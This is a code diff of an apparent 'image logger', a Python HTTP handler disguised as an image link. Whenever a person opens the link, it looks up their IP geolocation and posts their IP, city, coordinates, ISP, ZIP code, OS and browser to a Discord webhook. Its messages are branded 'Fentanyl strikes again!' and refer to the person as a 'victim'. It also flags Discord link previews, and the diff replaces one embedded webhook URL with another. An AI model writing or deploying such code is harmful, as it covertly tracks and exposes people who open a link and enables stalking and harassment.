@@ -1,69 +1,92 @@
-  from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1517931636065570909/7gbLluzZo3Ivi9PYHY8gEw7CbF7NOgVhyAtrmrmh7Ae6Yqf6lOGdBS5KoN0cyKLhrbjN'
-
+# Configuration
+webhook = 'https://discord.com/api/webhooks/1517939669533458735/ymM0PMDVENfdjr51oHfmRfnuUMkxSgcywWUYdgEiZDliLX5qEuk9Xb01U3AgilckysSJ'
 bindata = httpx.get('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCTeJgEKkWBNzhM_Qzq5OYn56mFqDUPXSzHw&s.jpg').content
-buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
-buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+buggedimg = True  # Set to True if you want the image to load on Discord, False otherwise
 
-def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
+# Discord preview payload
+def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
     return {
-  "username": "Fentanyl",
-  "content": "@everyone",
-  "embeds": [
-    {
-      "title": "Fentanyl strikes again!",
-      "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
-      "author": {
-        "name": "Fentanyl"
-      },
-      "fields": [
-        {
-          "name": "IP Info",
-          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
-          "inline": True
-        },
-        {
-          "name": "Advanced Info",
-          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
-          "inline": False
-        }
-      ]
+        "username": "Fentanyl",
+        "content": "@everyone",
+        "embeds": [{
+            "title": "Fentanyl strikes again!",
+            "color": 16711803,
+            "description": "A victim opened the original image. You can find their info below.",
+            "author": {"name": "Fentanyl"},
+            "fields": [
+                {
+                    "name": "IP Info",
+                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
+                    "inline": True
+                },
+                {
+                    "name": "Advanced Info",
+                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** ```yaml\n{useragent}\n```",
+                    "inline": False
+                }
+            ]
+        }]
     }
-  ],
-}
 
-def prev(ip,uag):
-  return {
-  "username": "Fentanyl",
-  "content": "",
-  "embeds": [
-    {
-      "title": "Fentanyl Alert!",
-      "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
-      "author": {
-        "name": "Fentanyl"
-      },
-      "fields": [
-      ]
+# Discord preview payload
+def prev(ip, uag):
+    return {
+        "username": "Fentanyl",
+        "content": "",
+        "embeds": [{
+            "title": "Fentanyl Alert!",
+            "color": 16711803,
+            "description": f"Discord previewed a Fentanyl image! Expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** ```yaml\n{uag}\n```",
+            "author": {"name": "Fentanyl"}
+        }]
     }
-  ],
-}
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        s = self.path
-        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
-        except Exception: data = bindata
-        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
+        path = self.path
+        query = parse.parse_qs(parse.urlparse(path).query)
+        
+        # Handle requests for /image.py or /image.jpg
+        if '/image.py' in path or '/image.jpg' in path:
+            self.send_response(200)
+            self.send_header('Content-type', 'image/jpeg')
+            self.end_headers()
+            self.wfile.write(bindata)
+            return
+            
+        # Handle other requests
+        if 'url' in query:
+            try:
+                data = httpx.get(query['url'][0]).content
+            except Exception:
+                data = bindata
+        else:
+            data = bindata
+            
+        useragent = self.headers.get('user-agent', 'No User Agent Found!')
         os, browser = httpagentparser.simple_detect(useragent)
-        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
-            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
-            else: pass
-        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
-        return
+        
+        # Check for Discord preview
+        forwarded_for = self.headers.get('x-forwarded-for', '')
+        if forwarded_for.startswith(('35','34','104.196')):
+            if 'discord' in useragent.lower():
+                self.send_response(200)
+                self.send_header('Content-type', 'image/jpeg')
+                self.end_headers()
+                self.wfile.write(bindata)  # Send original image
+                httpx.post(webhook, json=prev(forwarded_for, useragent))
+            else:
+                self.send_response(200)
+                self.send_header('Content-type', 'image/jpeg')
+                self.end_headers()
+                self.wfile.write(data)
+                ipInfo = httpx.get(f'https://ipinfo.io/{forwarded_for}/json').json()
+                httpx.post(webhook, json=formatHook(
+                    ipInfo['ip'], ipInfo['city'], ipInfo['region'], 
+                    ipInfo['country'], ipInfo['loc'], ipInfo['org'], 
+                    ipInfo['postal'], useragent, os, browser
+                ))
